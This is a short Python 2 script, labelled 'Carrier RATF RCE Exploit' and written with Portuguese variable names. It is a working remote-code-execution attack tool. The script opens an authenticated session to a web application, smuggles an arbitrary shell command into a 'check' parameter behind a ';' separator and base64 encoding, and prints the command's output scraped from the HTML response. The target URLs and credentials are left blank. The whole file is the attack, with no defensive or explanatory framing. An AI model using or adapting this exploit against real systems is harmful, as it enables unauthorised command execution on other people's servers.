#!/usr/bin/env python

import re
import requests
import argparse
import base64

def create_carrier_session_request():
    carrier_session_request = requests.Session()
    url = ""
    parametros = {"username": "", "password": ""}
    carrier_session_request.post(url, parametros)
    return (carrier_session_request)
    
def carrier_rce_request(objeto_request, rce):
    rce = ";" + rce
    rce_url = ""
    parametro_vuln = {"check": base64.b64encode(rce)}
    rce_resposta = objeto_request.post(rce_url, parametro_vuln)
    return (filter_html_tags(rce_resposta.text))
    
def filter_html_tags(html):
    inicio_rce_index = html.find("Verify status")
    inicio_rce_index = html.find("<p>", inicio_rce_index)
    fim_rce_index = html.rfind("</p>", inicio_rce_index)
    resultado_rce_html = html[inicio_rce_index:fim_rce_index]
    resultado_rce_filtrado = resultado_rce_html.replace("<p>", "")
    resultado_rce_filtrado = resultado_rce_filtrado.replace("</p>", "\n")
    return (resultado_rce_filtrado)
    
def create_parser():
    parser = argparse.ArgumentParser(description="Carrier RATF RCE Exploit")
    parser.add_argument("-c", dest="rce", help="Comando a executar")
    return parser
    
def main():
    parser = create_parser()
    args = parser.parse_args()
    rce = str(args.rce)
    if rce == "None":
        parser.print_help()
    else:
        carrier_session_request = create_carrier_session_request()
        print carrier_rce_request(carrier_session_request, rce)

if __name__ == "__main__":
    main()
